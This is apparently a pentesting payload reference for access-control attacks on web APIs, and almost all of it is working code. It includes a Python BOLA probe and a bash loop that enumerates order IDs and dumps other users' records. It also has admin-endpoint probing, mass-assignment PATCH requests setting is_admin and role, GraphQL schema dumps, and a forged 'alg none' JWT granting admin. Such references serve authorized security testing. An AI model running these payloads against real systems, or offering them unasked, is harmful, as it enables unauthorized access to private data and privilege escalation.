# Attack Payloads: Access Control

## BOLA ID Enumeration

### Sequential ID probing (two-account test)
```python
#!/usr/bin/env python3
"""
BOLA two-account test: create resource as User A, access as User B.
Usage: python bola_probe.py --base-url https://target.com --token-a TOKEN_A --token-b TOKEN_B
"""
import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('--base-url', required=True)
parser.add_argument('--token-a', required=True, help='Session token for User A (resource owner)')
parser.add_argument('--token-b', required=True, help='Session token for User B (attacker)')
parser.add_argument('--resource-id', required=True, help='Resource ID belonging to User A')
parser.add_argument('--endpoint', default='/api/documents/{id}')
args = parser.parse_args()

url = args.base_url + args.endpoint.replace('{id}', args.resource_id)

# Verify User A can access their own resource
r_a = requests.get(url, headers={'Authorization': f'Bearer {args.token_a}'})
print(f"[User A] Status: {r_a.status_code} — expected 200")

# Attempt User B accessing User A's resource
r_b = requests.get(url, headers={'Authorization': f'Bearer {args.token_b}'})
print(f"[User B] Status: {r_b.status_code} — expected 403/404, VULN if 200")

if r_b.status_code == 200:
    print("[VULNERABLE] BOLA confirmed — User B accessed User A's resource")
    print(f"Response: {r_b.text[:500]}")
else:
    print(f"[NOT VULNERABLE or blocked] Got {r_b.status_code}")
```

### Mass ID sweep
```bash
# Enumerate IDs 1-1000 with attacker's session
for i in $(seq 1 1000); do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "Authorization: Bearer ATTACKER_TOKEN" \
        "https://target.com/api/orders/$i")
    if [ "$STATUS" = "200" ]; then
        echo "ID $i: ACCESSIBLE"
        curl -s -H "Authorization: Bearer ATTACKER_TOKEN" \
            "https://target.com/api/orders/$i" | python3 -m json.tool
    fi
done
```

## BFLA Probing — Admin Function with Regular User Token

### Test admin endpoints with user-level token
```bash
ADMIN_ENDPOINTS=(
    "/api/admin/users"
    "/api/admin/users/5/delete"
    "/api/users/5/promote"
    "/api/admin/export/all"
    "/api/management/stats"
    "/internal/debug/logs"
)

for endpoint in "${ADMIN_ENDPOINTS[@]}"; do
    echo -n "Testing $endpoint: "
    curl -s -o /dev/null -w "%{http_code}" \
        -H "Authorization: Bearer USER_LEVEL_TOKEN" \
        "https://target.com$endpoint"
    echo
done
```

## Privilege Escalation via Mass Assignment

### PATCH request with role escalation
```bash
# Attempt to set is_admin via profile update
curl -X PATCH https://target.com/api/users/me \
    -H 'Content-Type: application/json' \
    -H 'Authorization: Bearer USER_TOKEN' \
    -d '{"first_name": "test", "is_admin": true, "is_staff": true, "role": "admin", "is_superuser": true}'

# Check if escalation succeeded
curl https://target.com/api/users/me \
    -H 'Authorization: Bearer USER_TOKEN' | python3 -m json.tool | grep -i "admin\|staff\|role"
```

### Nested object privilege escalation
```json
{
    "profile": {
        "display_name": "test",
        "user": {
            "is_admin": true,
            "role": "SUPER_ADMIN"
        }
    }
}
```

## GraphQL Introspection Query

### Full schema dump
```graphql
{
  __schema {
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
          ofType {
            name
            kind
          }
        }
        args {
          name
          type {
            name
          }
        }
      }
    }
    queryType { name }
    mutationType { name }
    subscriptionType { name }
  }
}
```

### Targeted type inspection
```graphql
{
  __type(name: "User") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

### One-liner introspection via curl
```bash
curl -s -X POST https://target.com/graphql \
    -H 'Content-Type: application/json' \
    -d '{"query":"{ __schema { types { name fields { name } } } }"}' \
    | python3 -m json.tool | grep -A2 '"name"'
```

## JWT Algorithm Confusion / Role Escalation

### Decode JWT and inspect claims (without verification)
```python
import base64, json

def decode_jwt_payload(token):
    parts = token.split('.')
    payload_b64 = parts[1] + '=='  # add padding
    payload = base64.urlsafe_b64decode(payload_b64)
    return json.loads(payload)

token = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJ1c2VyIn0.signature"
print(decode_jwt_payload(token))
# Output: {"user_id": 123, "role": "user"}
# If role is in JWT body and server trusts it without DB check — forge with role=admin
```

### Forged JWT with none algorithm (if server accepts)
```python
import base64, json

def b64_encode(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()

header = {"alg": "none", "typ": "JWT"}
payload = {"user_id": 1, "role": "admin", "is_admin": True}
forged = f"{b64_encode(header)}.{b64_encode(payload)}."
print(f"Forged token: {forged}")
```
